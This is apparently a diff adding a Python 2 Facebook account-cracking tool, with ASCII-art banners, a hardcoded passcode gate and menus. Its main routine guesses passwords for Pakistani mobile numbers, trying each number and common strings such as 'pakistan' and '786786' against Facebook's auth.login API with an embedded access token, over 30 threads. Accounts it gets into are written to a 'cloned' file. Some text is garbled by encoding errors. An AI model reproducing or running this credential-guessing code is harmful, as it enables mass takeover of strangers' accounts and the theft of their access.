+\033[1;95m ,-'   _,  \    ,'    ( /      `.    /        `-,
+\033[1;94m `-.,-'     `.,'       `         `.,'  `\    ,-'
+\033[1;93m  ,'       _  /   ,,,      ,,,     \     `-. `-._
+\033[1;92m /-,     ,'  ;   ' _ \    / _ `     ; `.     `(`-\
+\033[1;91m  /-,        ;    (o)      (o)      ;          `'`,
+\033[1;91m,~-'  ,-'    \     '        `      /     \      <_
+\033[1;92m/-. ,'        \                   /       \     ,-'
+\033[1;93m  '`,     ,'   `-/             \-' `.      `-. <
+\033[1;94m   /_    /      /   (_     _)   \    \          `,
+\033[1;95m     `-._;  ,' |  .::.`-.-' :..  |       `-.    _\
+\033[1;96m       _/       \  `:: ,^. :.:' / `.        \,-'
+\033[1;97m     '`.   ,-'  /`-..-'-.-`-..-'\            `-.
+\033[1;97m       >_ /     ;  (\/( ' )\/)  ;     `-.    _<
+\033[1;96m       ,-'      `.  \`-^^^-'/  ,'        \ _<
+\033[1;95m        `-,  ,'   `. `     ,'   `-.   <`'
+\033[1;94m          ')        `._.,,_.'        \ ,-'
+\033[1;93m           '._        '`'`'   \       <
+\033[1;92m              >   ,'       ,   `-.   <`'
+"""
+
+Username = "Mateen"
+CorrectPasscode = "King"
+loop = 'true'
+while (loop == 'true'):
+    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
+    if (passcode == CorrectPasscode):
+            print """
+            \033[1;92mWelcome to All friend
+                  """
+            loop = 'false'
+    else:
+            print "\033[1;91mâ˜ ï¸�WRONG"
+            os.system('xdg-open https://www.facebook.com/ITXRANA.5214/')
+
+##### LICENSE #####
+#=================#
+def lisensi():
+    os.system('clear')
+    login()
+####login#########
+def login():
+    os.system('clear')
+    print logo1
+    print "\033[1;96m[1]\x1b[1;93mStart cloning ( no login )"
+    time.sleep(0.05)
+    print '\x1b[1;95m[0]\033[1;92m Exit (Coming Soon)'
+    pilih_login()
+
+def pilih_login():
+    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
+    if peak =="":
+        print "\x1b[1;95mFill In Correctly"
+        pilih_login()
+    elif peak =="1":
+        Zeek()
+def Zeek():
+    os.system('clear')
+    print logo1
+    print '\x1b[1;91m[1]  Start Cracking'
+    time.sleep(0.05)
+    print '\x1b[1;92m[0] \033[1;93m Back'
+    time.sleep(0.05)
+    action()
+
+def action():
+    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
+    if peak =='':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak =="1":              
+        os.system("clear")
+        print logo2
+        print "Enter any Pakistani Mobile code Number"+'\n'
+        print ' Enter any code 1 to 49'
+        try:
+            c = raw_input("\033[1;96mCHOOSE : ")
+            k="03"
+            idlist = ('.txt')
+            for line in open(idlist,"r").readlines():
+                id.append(line.strip())
+        except IOError:
+            print ("[!] File Not Found")
+            raw_input("\n[ Back ]")
+            blackmafiax()
+    elif peak =='0':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 50* '\033[1;91m-'
+    xxx = str(len(id))
+    jalan ('\033[1;91m Total ids number: '+xxx)
+    jalan ('\033[1;93mCode you choose: '+c)
+    jalan ("\033[1;95mTotal 5 password will clone ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â 11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
+    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
+    print 50* '\033[1;92m-'
+    def main(arg):
+        global cpb,oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1                                       
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k+c+user+pass1+'\n')
+                okb.close()
+                oks.append(c+user+pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1
+                    cps = open('save/cloned.txt', 'a')
+                    cps.write(k+c+user+pass1+'\n')
+                    cps.close()
+                    cpb.append(c+user+pass1)
+                else:
+                    pass2 = k + c + user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2
+                        okb = open('save/cloned.txt', 'a')
+                        okb.write(k+c+user+pass2+'\n')
+                        okb.close()
+                        oks.append(c+user+pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\033[1;93m(CP) ' + k + c + user + '  |  ' + pass2
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write(k+c+user+pass2+'\n')
+                            cps.close()
+                            cpb.append(c+user+pass2)
+                        else:
+                            pass3="000786"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3
+                                okb = open('save/cloned.txt', 'a')
+                                okb.write(k+c+user+pass3+'\n')
+                                okb.close()
+                                oks.append(c+user+pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\033[1;95m(CP) ' + k + c + user + '  |  ' + pass3 
+                                    cps = open('save/cloned.txt', 'a')
+                                    cps.write(k+c+user+pass3+'\n')
+                                    cps.close()
+                                    cpb.append(c+user+pass3)
+                                else:
+                                    pass4="pakistan"
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4 
+                                        okb = open('save/cloned.txt', 'a')
+                                        okb.write(k+c+user+pass4+'\n')
+                                        okb.close()
+                                        oks.append(c+user+pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\033[1;96m(CP) ' + k + c + user + '  |  ' + pass4
+                                            cps = open('save/cloned.txt', 'a')
+                                            cps.write(k+c+user+pass4+'\n')
+                                            cps.close()
+                                            cpb.append(c+user+pass4)
+                                        else:
+                                            pass5="786786"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass5+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;94m(CP) ' + k + c + user + '  |  ' + pass5 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass5+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass5)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50* '\033[1;91m-'
+    print 'Hamayun Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
+    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    print('Hamayun Cloned Accounts Has Been Saved : save/cloned.txt')
+    jalan("Note : Your (CP)Accounts Open after 5 to 8 days")
+    print ''
+    print """
+    
+    
+    
+    
+\033[1;91mThanks \033[1;97mUsing My Tool
+"""
+
+
+    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
+    login() 
+
+if __name__ == '__main__':
+    login()
